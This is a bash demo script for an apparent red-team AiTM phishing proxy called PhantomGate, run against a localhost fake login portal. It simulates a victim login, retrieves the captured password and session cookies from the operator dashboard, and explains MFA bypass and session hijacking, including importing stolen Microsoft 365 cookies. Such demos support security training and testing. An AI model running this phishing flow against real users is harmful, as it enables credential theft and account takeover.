#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════
#  PhantomGate — Fully Automated Demo
#  Runs a SAFE local-only demo showing the full AiTM attack flow.
#  No real targets are contacted. Everything runs on localhost.
#
#  Usage:
#    ./demo.sh          # Interactive (pauses between steps)
#    ./demo.sh --auto   # Fully automated (no input needed)
# ═══════════════════════════════════════════════════════════════

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

cd "$(dirname "$0")"

AUTO=false
[[ "$1" == "--auto" || "$1" == "-a" ]] && AUTO=true

pause() {
    if $AUTO; then
        sleep 2
    else
        echo -e "  Press ${BOLD}Enter${NC} to continue..."
        read -r
    fi
}

# ───────────────────────────────────────
# Cleanup on exit
# ───────────────────────────────────────
PIDS=()
cleanup() {
    echo ""
    echo -e "  ${YELLOW}[!] Shutting down demo...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    rm -f /tmp/pg_demo_data.json /tmp/pg_demo_*.txt
    echo -e "  ${GREEN}[+] Demo cleaned up. Goodbye!${NC}"
    echo ""
}
trap cleanup EXIT INT TERM

# ───────────────────────────────────────
# Auto-build if binaries missing
# ───────────────────────────────────────
if [ ! -f "bin/phantomgate" ] || [ ! -f "bin/fake_target" ]; then
    echo -e "  ${YELLOW}[!] Binaries not found. Building automatically...${NC}"
    if ! command -v go &>/dev/null; then
        echo -e "  ${RED}[!] Go is not installed. Install from https://go.dev/dl/ and retry.${NC}"
        exit 1
    fi
    mkdir -p bin
    echo -e "  ${DIM}    Building phantomgate...${NC}"
    go build -ldflags "-s -w" -o bin/phantomgate ./cmd/phantomgate
    echo -e "  ${DIM}    Building fake_target...${NC}"
    go build -o bin/fake_target ./test/fake_target
    echo -e "  ${GREEN}[+] Build complete.${NC}"
    echo ""
fi

# ───────────────────────────────────────
# Kill anything on our ports
# ───────────────────────────────────────
for port in 9999 8443 8080 9443; do
    PID_ON_PORT=$(ss -tlnp 2>/dev/null | grep ":${port} " | grep -oP 'pid=\K[0-9]+' | head -1)
    if [ -n "$PID_ON_PORT" ]; then
        echo -e "  ${YELLOW}[!] Port $port in use (PID $PID_ON_PORT). Killing it...${NC}"
        kill "$PID_ON_PORT" 2>/dev/null || true
        sleep 0.5
    fi
done

ADMIN_PASS="demo-$(date +%s | tail -c 6)"

# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════
clear
echo -e "${RED}"
echo "   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗"
echo "   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║"
echo "   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║"
echo "   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║"
echo "   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║"
echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝"
echo "              ██████╗  █████╗ ████████╗███████╗"
echo "             ██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝"
echo "             ██║  ███╗███████║   ██║   █████╗"
echo "             ██║   ██║██╔══██║   ██║   ██╔══╝"
echo "             ╚██████╔╝██║  ██║   ██║   ███████╗"
echo "              ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝"
echo -e "${NC}"
if $AUTO; then
    echo -e "   ${BOLD}Fully Automated Demo — Safe Local-Only Environment${NC}"
else
    echo -e "   ${BOLD}Interactive Demo — Safe Local-Only Environment${NC}"
fi
echo -e "   ${DIM}No real targets are contacted. Everything runs on 127.0.0.1${NC}"
echo ""
echo -e "   ${CYAN}This demo shows how an Adversary-in-the-Middle (AiTM)"
echo -e "   reverse proxy captures credentials and session tokens"
echo -e "   by sitting transparently between a victim and a login portal.${NC}"
echo ""

if $AUTO; then
    echo -e "   ${DIM}Running in fully automated mode. Sit back and watch.${NC}"
    sleep 3
else
    echo -e "   Press ${BOLD}Enter${NC} to begin, or ${BOLD}Ctrl+C${NC} to exit."
    read -r
fi

# ═══════════════════════════════════════════════════════════════
#  STEP 1: Start the fake target (simulates a corporate login)
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "  ${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "  ${CYAN}║  STEP 1/5 — Starting Fake Corporate Login Portal       ║${NC}"
echo -e "  ${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${DIM}This is a simple web server that simulates a real login page."
echo -e "  In a real engagement, this would be Microsoft 365, Google, etc.${NC}"
echo ""

./bin/fake_target &>/dev/null &
PIDS+=($!)
sleep 1

if curl -s http://127.0.0.1:9999/login | grep -q "Login Portal"; then
    echo -e "  ${GREEN}[+]${NC} Fake login portal running at ${BOLD}http://127.0.0.1:9999/login${NC}"
else
    echo -e "  ${RED}[!]${NC} Failed to start fake target. Aborting."
    exit 1
fi
echo ""
echo -e "  ${DIM}What the victim sees:${NC}"
echo -e "  ┌────────────────────────────────────────┐"
echo -e "  │  ${BOLD}Corporate Login Portal${NC}                 │"
echo -e "  │                                        │"
echo -e "  │  Username: [___________________]       │"
echo -e "  │  Password: [___________________]       │"
echo -e "  │                                        │"
echo -e "  │           [ Sign In ]                  │"
echo -e "  └────────────────────────────────────────┘"
echo ""
pause

# ═══════════════════════════════════════════════════════════════
#  STEP 2: Start PhantomGate (the AiTM proxy)
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "  ${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "  ${CYAN}║  STEP 2/5 — Starting PhantomGate AiTM Proxy            ║${NC}"
echo -e "  ${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${DIM}PhantomGate sits between the victim and the real login server."
echo -e "  It forwards everything transparently — the victim sees the REAL"
echo -e "  login page, but all traffic passes through us.${NC}"
echo ""
echo -e "  ${YELLOW}Attack architecture:${NC}"
echo ""
echo -e "    Victim's Browser"
echo -e "         │"
echo -e "         │  HTTPS (thinks it's the real site)"
echo -e "         ▼"
echo -e "    ┌─────────────────┐"
echo -e "    │  ${RED}${BOLD}PhantomGate${NC}      │  ◄── ${RED}Captures credentials + cookies${NC}"
echo -e "    │  ${DIM}(reverse proxy)${NC}  │"
echo -e "    └────────┬────────┘"
echo -e "         │"
echo -e "         │  HTTPS (real connection)"
echo -e "         ▼"
echo -e "    ┌─────────────────┐"
echo -e "    │  Real Login      │"
echo -e "    │  ${DIM}(127.0.0.1:9999)${NC}│"
echo -e "    └─────────────────┘"
echo ""

rm -f /tmp/pg_demo_data.json
./bin/phantomgate \
    --domain demo.local \
    --phishlet "Test App" \
    --https-port 8443 \
    --http-port 8080 \
    --admin-port 9443 \
    --admin-pass "$ADMIN_PASS" \
    --phishlet-dir phishlets \
    --store /tmp/pg_demo_data.json \
    &>/tmp/pg_demo_server.log &
PIDS+=($!)
sleep 2

if curl -sk --resolve app.demo.local:8443:127.0.0.1 https://app.demo.local:8443/ -o /dev/null 2>/dev/null; then
    echo -e "  ${GREEN}[+]${NC} PhantomGate proxy running at ${BOLD}https://app.demo.local:8443${NC}"
    echo -e "  ${GREEN}[+]${NC} Operator dashboard at ${BOLD}http://127.0.0.1:9443${NC}"
    echo -e "  ${GREEN}[+]${NC} Dashboard password: ${BOLD}$ADMIN_PASS${NC}"
else
    echo -e "  ${RED}[!]${NC} Failed to start PhantomGate. Check /tmp/pg_demo_server.log"
    exit 1
fi

echo ""
echo -e "  ${BOLD}Host mapping:${NC}  app.demo.local  →  127.0.0.1:9999 (real server)"
echo ""
pause

# ═══════════════════════════════════════════════════════════════
#  STEP 3: Simulate victim browsing + login
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "  ${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "  ${CYAN}║  STEP 3/5 — Simulating Victim Login                    ║${NC}"
echo -e "  ${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${DIM}A victim clicks a phishing link and arrives at what looks like"
echo -e "  their normal login page. They enter their credentials...${NC}"
echo ""

echo -e "  ${YELLOW}[VICTIM]${NC} Visiting https://app.demo.local/login ..."
LOGIN_PAGE=$(curl -sk --resolve app.demo.local:8443:127.0.0.1 \
    https://app.demo.local:8443/login 2>/dev/null)

if echo "$LOGIN_PAGE" | grep -q "Corporate Login Portal"; then
    echo -e "  ${GREEN}[+]${NC} Victim sees the login page (identical to the real one)"
else
    echo -e "  ${RED}[!]${NC} Login page not served correctly"
fi

echo ""
echo -e "  ${YELLOW}[VICTIM]${NC} Entering credentials:"
echo -e "           Username: ${BOLD}sarah.connor@skynet-corp.com${NC}"
echo -e "           Password: ${BOLD}Tr0jan_H0rse!2026${NC}"
echo ""
sleep 1

RESPONSE=$(curl -sk --resolve app.demo.local:8443:127.0.0.1 \
    -X POST https://app.demo.local:8443/login \
    -d "username=sarah.connor@skynet-corp.com&password=Tr0jan_H0rse!2026" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b "_pg_vid=demo_victim_sarah" \
    -D /tmp/pg_demo_headers.txt \
    2>/dev/null)

if echo "$RESPONSE" | grep -q "Welcome"; then
    echo -e "  ${GREEN}[+]${NC} Victim logged in successfully — sees: \"Welcome sarah.connor@skynet-corp.com!\""
    echo -e "  ${DIM}  (The victim has no idea their credentials were captured)${NC}"
else
    echo -e "  ${RED}[!]${NC} Login simulation failed"
fi

echo ""
echo -e "  ${RED}${BOLD}  Meanwhile, behind the scenes...${NC}"
echo ""
sleep 1

echo -e "  ${DIM}PhantomGate server log:${NC}"
grep -E "CREDENTIAL|SESSION|FULL" /tmp/pg_demo_server.log 2>/dev/null | while read -r line; do
    echo -e "  ${RED}  $line${NC}"
done

echo ""
pause

# ═══════════════════════════════════════════════════════════════
#  STEP 4: Show captured data
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "  ${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "  ${CYAN}║  STEP 4/5 — Viewing Captured Data                      ║${NC}"
echo -e "  ${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${DIM}The red team operator queries the dashboard API to see"
echo -e "  everything PhantomGate intercepted.${NC}"
echo ""
sleep 1

echo -e "  ${BOLD}Dashboard Stats:${NC}"
STATS=$(curl -s http://127.0.0.1:9443/api/stats -H "X-Admin-Token: $ADMIN_PASS" 2>/dev/null)
VICTIMS=$(echo "$STATS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total_victims',0))" 2>/dev/null || echo "?")
CREDS=$(echo "$STATS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total_credentials',0))" 2>/dev/null || echo "?")
SESSIONS=$(echo "$STATS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total_sessions',0))" 2>/dev/null || echo "?")

echo -e "  ┌───────────────────────────────────────────────────────┐"
printf "  │  Victims: ${RED}%-3s${NC}  Credentials: ${RED}%-3s${NC}  Sessions: ${GREEN}%-3s${NC}   │\n" "$VICTIMS" "$CREDS" "$SESSIONS"
echo -e "  └───────────────────────────────────────────────────────┘"
echo ""

echo -e "  ${RED}${BOLD}Stolen Credentials:${NC}"
VICTIM_DATA=$(curl -s http://127.0.0.1:9443/api/victims -H "X-Admin-Token: $ADMIN_PASS" 2>/dev/null)

STOLEN_USER=$(echo "$VICTIM_DATA" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data and len(data) > 0 and data[0].get('credentials'):
    print(data[0]['credentials'][0].get('username',''))
" 2>/dev/null || echo "(none)")

STOLEN_PASS=$(echo "$VICTIM_DATA" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data and len(data) > 0 and data[0].get('credentials'):
    print(data[0]['credentials'][0].get('password',''))
" 2>/dev/null || echo "(none)")

STOLEN_IP=$(echo "$VICTIM_DATA" | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data and len(data) > 0:
    print(data[0].get('ip',''))
" 2>/dev/null || echo "(none)")

echo -e "  ┌─────────────────────────────────────────────────────────┐"
echo -e "  │  ${BOLD}Username:${NC}  ${RED}$STOLEN_USER${NC}"
echo -e "  │  ${BOLD}Password:${NC}  ${RED}$STOLEN_PASS${NC}"
echo -e "  │  ${BOLD}Victim IP:${NC} $STOLEN_IP"
echo -e "  └─────────────────────────────────────────────────────────┘"
echo ""

echo -e "  ${GREEN}${BOLD}Stolen Session Tokens (for session hijacking):${NC}"
EXPORT=$(curl -s "http://127.0.0.1:9443/api/sessions/export?victim_id=demo_victim_sarah" \
    -H "X-Admin-Token: $ADMIN_PASS" 2>/dev/null)

COOKIE_STR=$(echo "$EXPORT" | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(data.get('cookie_string','(none captured)'))
" 2>/dev/null || echo "(none)")

echo -e "  ┌─────────────────────────────────────────────────────────┐"
echo -e "  │  ${BOLD}Cookie String:${NC} ${GREEN}$COOKIE_STR${NC}"
echo -e "  │"
echo -e "  │  ${DIM}An attacker pastes this into their browser's DevTools"
echo -e "  │  to hijack the victim's authenticated session — no${NC}"
echo -e "  │  ${DIM}password or MFA needed. The session is already valid.${NC}"
echo -e "  └─────────────────────────────────────────────────────────┘"
echo ""
pause

# ═══════════════════════════════════════════════════════════════
#  STEP 5: Explain what happened
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "  ${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "  ${CYAN}║  STEP 5/5 — How It Works                               ║${NC}"
echo -e "  ${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BOLD}1. PHISHING LINK${NC}"
echo -e "     The attacker sends the victim a link like:"
echo -e "     ${CYAN}https://login.your-phish-domain.com/login?_lid=pg_abc123${NC}"
echo -e "     This looks legitimate but points to PhantomGate."
echo ""
echo -e "  ${BOLD}2. TRANSPARENT PROXY${NC}"
echo -e "     PhantomGate receives the request and forwards it to the"
echo -e "     REAL login server (e.g., login.microsoftonline.com)."
echo -e "     The victim sees the actual login page — not a clone."
echo ""
echo -e "  ${BOLD}3. CREDENTIAL CAPTURE${NC}"
echo -e "     When the victim submits their username/password, the POST"
echo -e "     body passes through PhantomGate. It extracts the credentials"
echo -e "     and forwards the request to the real server."
echo ""
echo -e "  ${BOLD}4. MFA BYPASS${NC}"
echo -e "     The victim completes MFA normally (authenticator app, SMS, etc)."
echo -e "     This works because they're talking to the REAL server through"
echo -e "     our proxy. After MFA succeeds, the server sets session cookies."
echo ""
echo -e "  ${BOLD}5. SESSION HIJACKING${NC}"
echo -e "     PhantomGate captures the post-auth session cookies"
echo -e "     (e.g., ESTSAUTH for Microsoft 365). The attacker imports"
echo -e "     these cookies into their own browser — instant access to"
echo -e "     the victim's account, no password or MFA needed."
echo ""
echo -e "  ${BOLD}6. OPERATOR DASHBOARD${NC}"
echo -e "     Everything appears in real-time on the operator console:"
echo -e "     ${CYAN}http://127.0.0.1:9443${NC}  (password: ${BOLD}$ADMIN_PASS${NC})"
echo ""

echo -e "  ${GREEN}${BOLD}================================================================${NC}"
echo -e "  ${GREEN}${BOLD}  Demo complete!${NC}"
echo -e "  ${GREEN}${BOLD}================================================================${NC}"
echo ""
echo -e "  ${BOLD}Available phishlets:${NC}"
for yml in phishlets/*.yml; do
    name=$(grep "^name:" "$yml" | head -1 | sed 's/name: *"*//;s/"$//')
    echo -e "    - $name  ${DIM}($yml)${NC}"
done
echo ""
echo -e "  ${BOLD}Next steps:${NC}"
echo -e "    1. Open the dashboard: ${CYAN}http://127.0.0.1:9443${NC}"
echo -e "       Password: ${BOLD}$ADMIN_PASS${NC}"
echo -e "    2. Check the README.md for real engagement setup"
echo -e "    3. Press ${BOLD}Ctrl+C${NC} to stop the demo"
echo ""

if $AUTO; then
    echo -e "  ${DIM}Auto mode: dashboard stays live for 60s, then auto-exits.${NC}"
    echo -e "  ${DIM}Press Ctrl+C to exit sooner.${NC}"
    sleep 60
else
    echo -e "  ${DIM}Dashboard is live. Press Ctrl+C to exit.${NC}"
    wait
fi
